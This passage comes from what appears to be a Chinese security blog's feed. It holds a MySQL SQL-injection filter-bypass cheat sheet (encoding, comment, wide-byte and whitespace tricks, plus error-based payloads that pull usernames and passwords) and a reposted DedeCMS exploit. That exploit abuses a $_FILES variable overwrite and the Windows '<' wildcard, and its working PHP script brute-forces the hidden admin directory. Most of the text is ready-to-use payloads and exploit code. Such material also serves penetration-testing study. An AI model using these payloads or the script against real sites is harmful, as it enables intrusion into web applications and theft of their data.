title="sleep过滤"></a>sleep过滤</h2><p><code>BENCHMARK(count,expr)</code></p><p><code>BENCHMARK()</code>函数重复<code>countTimes</code>次执行表达式<code>expr</code>,执行的时间长了，也达到了sleep的作用。</p><pre><code class="hljs mysql">if(ascii(substring((database()),1,1))&gt;1,(select benchmark(10000000,md5(0x41))),1)</code></pre><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><p><code>URLEncode编码</code>，<code>ASCII</code>，<code>HEX</code>，<code>unicode编码</code>绕过</p><blockquote><p>URL编码：<code>or 1=1</code>即<code>%6f%72%20%31%3d%31</code></p></blockquote><blockquote><p>url双重编码; <code>?id=1%252f%252a\*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a\*/FROM%252f%252a\*/Users--+</code></p></blockquote><blockquote><p>hex编码：见16进制绕过单引号</p></blockquote><blockquote><p>ascii编码: <code>select * from users where username=char(97,100,109,105,110)</code></p></blockquote><p>或者</p><p><code>char(101)+char(97)+char(105)+char(116)</code></p><blockquote><p>unicode编码：</p></blockquote><p>一些unicode编码举例：</p><pre><code class="hljs unicode">单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</code></pre><blockquote><p>html 实体编码：SELECT FROM Users WHERE username = &#39;admin&#39;</p></blockquote><h2 id="substr-的逗号绕过"><a href="#substr-的逗号绕过" class="headerlink" title="substr()的逗号绕过"></a>substr()的逗号绕过</h2><p><code>from 1 for 1</code> 代替 <code>substr(,1,1)</code></p><pre><code class="hljs mysql">select * from users where id&#x3D;1 union select 1,2, substr((select username from users limit 0,1),1,1);select * from users where id&#x3D;1 union select 1,2, substr((select username from users limit 0,1) from 1 for 1);</code></pre><pre><code class="hljs mysql">mysql&gt; select * from users where id&#x3D;1 union select 1,2, substr((select username from users limit 0,1),1,1);+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | Dumb     | Dumb     ||  1 | 2        | D        |+----+----------+----------+2 rows in set (0.01 sec)mysql&gt; select * from users where id&#x3D;1 union select 1,2, substr((select username from users limit 0,1) from 1 for 1);+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | Dumb     | Dumb     ||  1 | 2        | D        |+----+----------+----------+2 rows in set (0.00 sec)</code></pre><h2 id="limit-逗号绕过"><a href="#limit-逗号绕过" class="headerlink" title="limit 逗号绕过"></a>limit 逗号绕过</h2><p><code>limit 1 offset 0</code> 代替 <code>limit 0,1</code></p><pre><code class="hljs mysql">select * from users where id&#x3D;1 union select 1,2, substr((select username from users limit 1 offset 0),1,1);</code></pre><h2 id="其他逗号绕过（使用join"><a href="#其他逗号绕过（使用join" class="headerlink" title="其他逗号绕过（使用join)"></a>其他逗号绕过（使用join)</h2><pre><code class="hljs mysql">select * from users union select 1,2,3;select * from users union select * from (select 1)a join (select 2)b join (select 3)c;</code></pre><h2 id="greatest-between-绕过-lt-gt-等比较符号"><a href="#greatest-between-绕过-lt-gt-等比较符号" class="headerlink" title="greatest between 绕过&lt;,&gt; 等比较符号"></a>greatest between 绕过&lt;,&gt; 等比较符号</h2><p>当我们盲注的时候，要用到比较符号，如果过滤了可以用<code>greatest(x,y,z,..)</code>绕过 返回的是他们的最大值</p><pre><code class="hljs mysql">select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;64</code></pre><p>改成</p><pre><code class="hljs mysql">select * from users where id&#x3D;1 and greatest(ascii(substr(database(),0,1)),64)&#x3D;64</code></pre><p>当然这里的等于号可以改成<code>in()</code></p><pre><code class="hljs mysql">SELECT * FROM &#96;p_archives_3&#96; WHERE &#96;picsad&#96; between 1113 and 1122</code></pre><p>等同于</p><pre><code class="hljs mysql">SELECT * FROM &#96;p_archives_3&#96; WHERE &#96;picsad&#96; &gt;&#x3D; 1113 and &#96;picsad&#96;&lt;&#x3D;1122</code></pre><p>你要保证<code>picsad</code>是<code>数字类型</code>的</p><h2 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h2><blockquote><p>()</p></blockquote><p>括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格<br><code>select(user())from dual where(1=1)and(2=2)</code><br><code>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</code></p><blockquote><p>/**/或者/*1*/</p></blockquote><blockquote><p>%0d %0a %0c %0b %a0</p></blockquote><blockquote><p>+</p></blockquote><blockquote><p>TAB</p></blockquote><blockquote><p>两个括号</p></blockquote><blockquote><p>把上面说的编一下码试试</p></blockquote><blockquote><p>select Afrom B 默认from后面必须是空格再加表名，因此为了不让你使用from可能正则表达式会检测后面的空格，我们可以用科学计数法绕过，因为1e0后面可以没有空格</p></blockquote><p><code>select A,1E0fromB</code></p><p>这里的逗号是两列的意思 1e0占了第二列</p><p>同样，上面的1E0可以用1.0代替</p><blockquote><p><code>\N</code> 绕过是绕过<code>NULL</code>,因为<code>\N</code>相当于<code>NULL</code></p></blockquote><pre><code class="hljs mysql">select * from pass where id&#x3D;\Nunion select 1,2, greatest((substr((select username from users limit 1 offset 0),1,1)),&#39;v&#39;)in(&#39;v&#39;);</code></pre><blockquote><p><code>id</code> 与<code>from</code>在之间的空格绕过</p></blockquote><pre><code class="hljs mysql">select+id-1+1.from users;select-id-1+3.from users;</code></pre><p>注意：第二句得到的id将会是 -id+2</p><h2 id="常见的注释"><a href="#常见的注释" class="headerlink" title="常见的注释"></a>常见的注释</h2><blockquote><p>–+</p></blockquote><blockquote><p>#</p></blockquote><blockquote><p>%23</p></blockquote><blockquote><p>– -</p></blockquote><blockquote><p>%00</p></blockquote><blockquote><p>`单行或者多行注释（别名）</p></blockquote><blockquote><p>/* */ 单行或者多行注释</p></blockquote><h2 id="利用过滤删除绕过"><a href="#利用过滤删除绕过" class="headerlink" title="利用过滤删除绕过"></a>利用过滤删除绕过</h2><p>比如说他过滤了<code>/**/</code>（将其删除）又过滤了<code>select</code>那么我们可以这么写<br><code>sel/**/ect</code>.</p><p>意思就是被删除的可以加在另一个要删除的里面，这样不仅不会识别，删除后又还原了，实现绕过，这里面还包括双写被过滤字符的方法</p><h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>经常试试大小写混合比如 <code>UnIOn sELecT</code>….</p><h2 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h2><p>介绍一下什么是内联注释：/<em>!</em>/在其他数据库语言中是注释，但是在sql中却可以执行，为了sql提高语句的兼容性.</p><pre><code class="hljs mysql">id&#x3D;1&#x2F;*!UnIoN*&#x2F;+SeLeCT+1,2,concat(&#x2F;*!table_name*&#x2F;)+FrOM &#x2F;*information_schema*&#x2F;.tables &#x2F;*!WHERE *&#x2F;+&#x2F;*!TaBlE_ScHeMa*&#x2F;+like+database()-- -&#x2F;*!50001from*&#x2F; 表示在mysql版本高于50001也就是mysql5中可以执行这条命令</code></pre><h2 id="拆分字符串绕过"><a href="#拆分字符串绕过" class="headerlink" title="+ - . 拆分字符串绕过"></a>+ - . 拆分字符串绕过</h2><pre><code class="hljs mysql">?id&#x3D;1&#39; or &#39;11+11&#39;&#x3D;&#39;11+11&#39;&quot;-&quot;和&quot;.&quot;</code></pre><h2 id="符号代替文字绕过"><a href="#符号代替文字绕过" class="headerlink" title="符号代替文字绕过"></a>符号代替文字绕过</h2><blockquote><p>&amp;&amp;代替and</p></blockquote><blockquote><p>||代替or</p></blockquote><blockquote><p>| 代替 xor</p></blockquote><h2 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h2><p>简单的讲一下，一般当引号被过滤就会在引号前加一个<code>\</code>，将其转义失去作用，这样我们就不能闭合引号完成注入了。但是如果他的字符集设置为了双字节，也就是说两个字符可以代表一个中文的情况，那么我们就可以构造成一个中文字，<code>\</code>的url是<code>%27</code>我们在引号前写上<code>%df</code>，那么<code>%df%27</code>构成了中文的繁体运,引号就没有被过滤，成功绕过。当然不只是<code>%df</code>只要在那个字符集的范围内都可以。如<code>%bf%27</code> <code>%df%27</code> <code>%aa%27</code></p><h2 id="等价函数变量的绕过"><a href="#等价函数变量的绕过" class="headerlink" title="等价函数变量的绕过"></a>等价函数变量的绕过</h2><blockquote><p>hex()、bin() ==&gt; ascii()</p></blockquote><blockquote><p>sleep() ==&gt;benchmark()</p></blockquote><p>这里补充一下:</p><pre><code class="hljs mipsasm">在sqlsever 中用 <span class="hljs-keyword">waitfor </span>delay在<span class="hljs-keyword">Oracle </span>中用 DBMS_PIPE.RECEIVE_MESSAGE()函数和CASEWHEN„THEN„语句</code></pre><blockquote><p>concat_ws()==&gt;group_concat()</p></blockquote><blockquote><p>mid()、substr() ==&gt; substring()</p></blockquote><blockquote><p>@@user ==&gt; user()</p></blockquote><blockquote><p>@@datadir ==&gt; datadir()</p></blockquote><blockquote><p>@@version ==&gt; version()</p></blockquote><h2 id="数字的其他写法绕过空格"><a href="#数字的其他写法绕过空格" class="headerlink" title="数字的其他写法绕过空格"></a>数字的其他写法绕过空格</h2><pre><code class="hljs mysql">select * from users where id&#x3D;8E0union select 1,2,3,4,5,6,7,8,9,0select * from users where id&#x3D;8.0union select 1,2,3,4,5,6,7,8,9,0</code></pre><p>注：E0是科学计数法</p><h2 id="conv-10-36-代替字母"><a href="#conv-10-36-代替字母" class="headerlink" title="conv(,10,36)代替字母"></a>conv(,10,36)代替字母</h2><p>conv(10,10,36)是大写的A<br>lower(conv(10,10,36/16s))小写的a</p><h2 id="常见的bypass"><a href="#常见的bypass" class="headerlink" title="常见的bypass"></a>常见的bypass</h2><blockquote><p>id=1+(UnIoN)+(SelECT)+</p></blockquote><blockquote><p>id=1+(UnIoN+SeLeCT)+</p></blockquote><blockquote><p>id=1+(UnI)(oN)+(SeL)(EcT)</p></blockquote><blockquote><p>id=1+’UnI’’On’+’SeL’’ECT’ &lt;-MySQL only</p></blockquote><blockquote><p>id=1+’UnI’||’on’+SeLeCT’ &lt;-MSSQL only</p></blockquote><h2 id="使用count-返回数据行数"><a href="#使用count-返回数据行数" class="headerlink" title="使用count(*) 返回数据行数"></a>使用count(*) 返回数据行数</h2><pre><code class="hljs mysql">select count(*) from users;+----------+| count(*) |+----------+|       13 |+----------+</code></pre><p>注意： 这里的行数只是真正的行数，不是最终的id 编号</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><strong>1.extractvalue 报错</strong></p><pre><code class="hljs mysql">and extractvalue(1, concat(1, (select database() limit 0,1)))--+;</code></pre><p>查表<br><code>and extractvalue(1, concat(1,(select table_name from information_schema.tables limit 0,1)))–+;</code><br>查列<br><code>and extractvalue(1, concat(1,(select column_name from information_schema.columns limit 0,1)))–+;</code><br>查数据<br><code>and extractvalue(1, concat(1,(select password from users limit 0,1)))–+;</code></p><p><strong>2.UpdateXml报错</strong></p><p>测试语句</p><pre><code class="hljs sql">and 1=(updatexml(1,concat(0x3a,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())),<span class="hljs-number">1</span>))</code></pre><p>实际测试过程</p><pre><code class="hljs sql">mysql&gt; select * from article where id = 1 and 1=(updatexml(0x3a,concat(1,(select user())),1))ERROR 1105 (HY000): XPATH syntax error: ’:root@localhost’</code></pre><p><strong>3.运算数值的大小限制报错</strong></p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-keyword">exp</span>(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a))；<span class="hljs-keyword">ERROR</span> <span class="hljs-number">1690</span> (<span class="hljs-number">22003</span>): <span class="hljs-keyword">DOUBLE</span> <span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">out</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">range</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;exp(~((select &#x27;</span>root@localhost<span class="hljs-string">&#x27; from dual)))&#x27;</span></code></pre><p>这个函数是计算e的n次方，~是按位取补，exp计算的次方数是有限制的，我们如果给他传一个字符串，php 的弱类型就会当成是0这样取反之后就超了，报错</p><p>类似的还有：</p><pre><code class="hljs sql"><span class="hljs-keyword">select</span> !(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x)-~<span class="hljs-number">0</span>;</code></pre><p>这里注意一下：</p><p>进行嵌套查询的时候子查询出来的的结果是作为一个派生表来进行上一级的查询的，所以子查询的结果必须要有一个别名，一般是as+别名 但是as 可以省略。</p><p><strong>4.floor()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);</code></pre><p><strong>5.geometrycollection()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b));</code></pre><p><strong>6.multipoint()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and multipoint((select * from(select * from(select user())a)b));</code></pre><p><strong>7.polygon()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and polygon((select * from(select * from(select user())a)b));</code></pre><p><strong>8.linestring()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and linestring((select * from(select * from(select user())a)b));</code></pre><p><strong>9.multilinestring()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b));</code></pre><p><strong>10.multipolygon()</strong></p><pre><code class="hljs mysql">select * from test where id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b));</code></pre><h2 id="限制与from的组合"><a href="#限制与from的组合" class="headerlink" title="限制与from的组合"></a>限制与from的组合</h2><p>用 <code>from.</code> 代替 <code>from</code></p><h2 id="如果遇到表名或者字段名是保留字"><a href="#如果遇到表名或者字段名是保留字" class="headerlink" title="如果遇到表名或者字段名是保留字"></a>如果遇到表名或者字段名是保留字</h2><p>这个时候最好使用点号连接表名和字段名，或者直接使用反引号包起来</p><h2 id="在函数名与括号间添加空格或者注释绕过函数过滤"><a href="#在函数名与括号间添加空格或者注释绕过函数过滤" class="headerlink" title="在函数名与括号间添加空格或者注释绕过函数过滤"></a>在函数名与括号间添加空格或者注释绕过函数过滤</h2><p><code>concat/**/()</code></p><h2 id="在查询时使用一个不存在的函数就能报错出数据库的名字"><a href="#在查询时使用一个不存在的函数就能报错出数据库的名字" class="headerlink" title="在查询时使用一个不存在的函数就能报错出数据库的名字"></a>在查询时使用一个不存在的函数就能报错出数据库的名字</h2><p><code>select password from contents where id=a()</code><br>这个a()是不存在的函数，结果如下</p><pre><code class="hljs mysql">mysql&gt; select username from users where id&#x3D;a();ERROR 1305 (42000): FUNCTION security.a does not exist</code></pre>]]></content>
    
    
    <categories>
      
      <category>SQL注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决DEDECMS历史难题--找后台目录</title>
    <link href="/p/40eeea0e.html"/>
    <url>/p/40eeea0e.html</url>
    
    <content type="html"><![CDATA[<h3 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h3><ul><li>  仅针对windows系统</li></ul><h3 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h3><p>首先看核心文件common.inc.php 大概148行左右</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>)&#123;    <span class="hljs-keyword">require_once</span>(DEDEINC.<span class="hljs-string">&#x27;/uploadsafe.inc.php&#x27;</span>);&#125;</code></pre><a id="more"></a><p>uploadsafe.inc.php</p><pre><code class="hljs php"><span class="hljs-keyword">if</span>( preg_match(<span class="hljs-string">&#x27;#^(cfg_|GLOBALS)#&#x27;</span>, <span class="hljs-variable">$_key</span>) )&#123;    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Request var not allow for uploadsafe!&#x27;</span>);&#125;<span class="hljs-variable">$$_key</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]; <span class="hljs-comment">//获取temp_name </span>$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125; = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;name&#x27;</span>];$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_type&#x27;</span>&#125; = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;type&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;#[^0-9a-z\./]#i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;type&#x27;</span>]);$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_size&#x27;</span>&#125; = <span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;size&#x27;</span>] = preg_replace(<span class="hljs-string">&#x27;#[^0-9]#&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-variable">$_key</span>][<span class="hljs-string">&#x27;size&#x27;</span>]);<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;) &amp;&amp; (preg_match(<span class="hljs-string">&quot;#\.(&quot;</span>.<span class="hljs-variable">$cfg_not_allowall</span>.<span class="hljs-string">&quot;)$#i&quot;</span>,$&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;) || !preg_match(<span class="hljs-string">&quot;#\.#&quot;</span>, $&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_name&#x27;</span>&#125;)) )&#123;    <span class="hljs-keyword">if</span>(!defined(<span class="hljs-string">&#x27;DEDEADMIN&#x27;</span>))    &#123;        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Not Admin Upload filetype not allow !&#x27;</span>);    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_size&#x27;</span>&#125;))&#123;    $&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_size&#x27;</span>&#125; = @filesize(<span class="hljs-variable">$$_key</span>);&#125;<span class="hljs-variable">$imtypes</span> = <span class="hljs-keyword">array</span>(    <span class="hljs-string">&quot;image/pjpeg&quot;</span>, <span class="hljs-string">&quot;image/jpeg&quot;</span>, <span class="hljs-string">&quot;image/gif&quot;</span>, <span class="hljs-string">&quot;image/png&quot;</span>,     <span class="hljs-string">&quot;image/xpng&quot;</span>, <span class="hljs-string">&quot;image/wbmp&quot;</span>, <span class="hljs-string">&quot;image/bmp&quot;</span>);<span class="hljs-keyword">if</span>(in_array(strtolower(trim($&#123;<span class="hljs-variable">$_key</span>.<span class="hljs-string">&#x27;_type&#x27;</span>&#125;)), <span class="hljs-variable">$imtypes</span>))&#123;    <span class="hljs-variable">$image_dd</span> = @getimagesize(<span class="hljs-variable">$$_key</span>);     <span class="hljs-comment">//问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。</span>    <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$image_dd</span>))    &#123;        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>);    &#125;&#125;......</code></pre><p>注意<code>$$_key</code>这一句，变量<code>$key</code>取自于<code>$_FILE</code>，由于<code>$_FILE</code>可控自然<code>$key</code>也可控,此处理论上是可以覆盖任意变量，但是前面有个正则判断不能出现<code>cfg_|GLOBALS</code>。(但是应该还可以覆盖其他变量此处感觉还可以深挖)</p><p>本人出发点是找个可以利用<code>&lt;&lt;</code>通配符猜解后台目录，所以只要<code>$$_key</code>参数可控就可以达到目的。</p><p>但在这之前有个<code>if(!defined(&#39;DEDEADMIN&#39;))</code>的判断,这个很好绕过设置<code>tmp_name为0或者1.jpg含.</code> 就可以绕过。</p><p>最后关键的一点就是要让文件存在还和不存在返回不同的内容就要控制type参数了。</p><p>当目录文件存在的时候 返回正常页面。当不存在的时候返回：Upload filetype not allow !</p><h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><p>文字不好表达，便于理解。</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// ./dedecms/favicon.ico</span><span class="hljs-keyword">if</span>(@getimagesize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;poc&#x27;</span>]))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;&#125;<span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-meta">?&gt;</span>get:http:<span class="hljs-comment">//localhost/test.php?poc=./d&lt;/favicon.ico</span>返回：<span class="hljs-number">1</span>http:<span class="hljs-comment">//localhost/test.php?poc=./a&lt;/favicon.ico</span>返回：<span class="hljs-number">0</span>http:<span class="hljs-comment">//localhost/test.php?poc=./de&lt;/favicon.ico</span>返回：<span class="hljs-number">1</span>http:<span class="hljs-comment">//localhost/test.php?poc=./ded&lt;/favicon.ico</span>返回：<span class="hljs-number">1</span>........</code></pre><h3 id="构造poc"><a href="#构造poc" class="headerlink" title="构造poc"></a>构造poc</h3><pre><code class="hljs sqf">http:<span class="hljs-comment">//localhost/dedecms/tags.php</span>post:dopost=save&amp;<span class="hljs-variable">_FILES</span>[b4dboy][tmp_name]=./de&lt;/images/admin_top_logo.gif&amp;<span class="hljs-variable">_FILES</span>[b4dboy][<span class="hljs-built_in">name</span>]=<span class="hljs-number">0</span>&amp;<span class="hljs-variable">_FILES</span>[b4dboy][<span class="hljs-built_in">size</span>]=<span class="hljs-number">0</span>&amp;<span class="hljs-variable">_FILES</span>[b4dboy][<span class="hljs-built_in">type</span>]=<span class="hljs-built_in">image</span>/gif</code></pre><p>Common.inc.php 是被全局包含的文件，只要文件php文件包含了Common.inc.php都可以进行测试，以tags.php文件为例</p><p>当目录存在点时候： </p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180226_%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98--%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/01.png" alt="解决DEDECMS历史难题--找后台目录"></p><p>当目录不存在点时候： </p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180226_%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98--%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/02.png" alt="解决DEDECMS历史难题--找后台目录"></p><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$domain</span>=<span class="hljs-string">&#x27;http://localhost/dedecms/&#x27;</span>;<span class="hljs-variable">$url</span>=<span class="hljs-variable">$domain</span>.<span class="hljs-string">&#x27;/index.php&#x27;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">post</span>(<span class="hljs-params"><span class="hljs-variable">$url</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$cookie</span> = <span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;    <span class="hljs-variable">$options</span> = <span class="hljs-keyword">array</span>(        CURLOPT_RETURNTRANSFER =&gt; <span class="hljs-literal">true</span>,        CURLOPT_HEADER =&gt; <span class="hljs-literal">true</span>,        CURLOPT_POST =&gt; <span class="hljs-literal">true</span>,        CURLOPT_SSL_VERIFYHOST =&gt; <span class="hljs-literal">false</span>,        CURLOPT_SSL_VERIFYHOST =&gt; <span class="hljs-literal">false</span>,        CURLOPT_COOKIE =&gt; <span class="hljs-variable">$cookie</span>,        CURLOPT_POSTFIELDS =&gt; <span class="hljs-variable">$data</span>,    );    <span class="hljs-variable">$ch</span> = curl_init(<span class="hljs-variable">$url</span>);    curl_setopt_array(<span class="hljs-variable">$ch</span>, <span class="hljs-variable">$options</span>);    <span class="hljs-variable">$result</span> = curl_exec(<span class="hljs-variable">$ch</span>);    curl_close(<span class="hljs-variable">$ch</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;&#125;<span class="hljs-variable">$testlen</span>=<span class="hljs-number">25</span>;<span class="hljs-variable">$str</span>=range(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;z&#x27;</span>);<span class="hljs-variable">$number</span>=range(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$dic</span> = array_merge(<span class="hljs-variable">$str</span>, <span class="hljs-variable">$number</span>);<span class="hljs-variable">$n</span>=<span class="hljs-literal">true</span>;<span class="hljs-variable">$nn</span>=<span class="hljs-literal">true</span>;<span class="hljs-variable">$path</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">while</span>(<span class="hljs-variable">$n</span>)&#123;    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dic</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$v</span>)&#123;        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dic</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$vv</span>)&#123;            <span class="hljs-comment">#echo $v.$vv .&#x27;----&#x27;;</span>            <span class="hljs-variable">$post_data</span>=<span class="hljs-string">&quot;dopost=save&amp;_FILES[b4dboy][tmp_name]=./<span class="hljs-subst">$v</span><span class="hljs-subst">$vv</span>&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif&quot;</span>;            <span class="hljs-variable">$result</span>=post(<span class="hljs-variable">$url</span>,<span class="hljs-variable">$post_data</span>);            <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$result</span>,<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;                <span class="hljs-variable">$path</span>=<span class="hljs-variable">$v</span>.<span class="hljs-variable">$vv</span>;<span class="hljs-variable">$n</span>=<span class="hljs-literal">false</span>;<span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-keyword">while</span>(<span class="hljs-variable">$nn</span>)&#123;    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dic</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$vvv</span>)&#123;        <span class="hljs-variable">$post_data</span>=<span class="hljs-string">&quot;dopost=save&amp;_FILES[b4dboy][tmp_name]=./<span class="hljs-subst">$path</span><span class="hljs-subst">$vvv</span>&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif&quot;</span>;        <span class="hljs-variable">$result</span>=post(<span class="hljs-variable">$url</span>,<span class="hljs-variable">$post_data</span>);        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$result</span>,<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;            <span class="hljs-variable">$path</span>.=<span class="hljs-variable">$vvv</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$path</span> . PHP_EOL;            <span class="hljs-variable">$giturl</span>=<span class="hljs-variable">$domain</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/images/admin_top_logo.gif&#x27;</span>;            <span class="hljs-keyword">if</span>(@file_get_contents(<span class="hljs-variable">$giturl</span>))&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$domain</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>;                <span class="hljs-variable">$nn</span>=<span class="hljs-literal">false</span>;<span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20180226_%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98--%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/03.png" alt="解决DEDECMS历史难题--找后台目录"></p><p>转载自：<a href="https://xianzhi.aliyun.com/forum/topic/2064">https://xianzhi.aliyun.com/forum/topic/2064</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
